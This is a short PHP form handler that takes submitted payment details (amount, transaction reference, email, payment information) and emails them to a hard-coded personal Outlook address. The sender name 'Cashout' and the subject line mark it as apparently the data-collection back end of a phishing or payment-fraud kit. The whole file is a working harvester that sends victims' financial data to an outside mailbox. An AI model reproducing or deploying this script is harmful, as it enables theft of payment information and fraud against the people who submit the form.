<?php
$amount=$_POST['amount'];
$transaction_ref=$_POST['transaction_ref'];
$email=$_POST['email'];
$payment_information=$_POST['payment_information'];
$nl="\r\n";
$from = "Cashout";
$to = "nwaforalex158@outlook.com";
$subject = "Cashout Is A Must By Gods  Grace";
$message = 'amount: ' . $amount . $nl.'transaction_ref: ' . $transaction_ref .$nl. 'email: ' . $email  . $nl. 'payment_information: ' . $payment_information ;
$headers = "From:" . $from;
mail($to,$subject,$message, $headers) 
?>
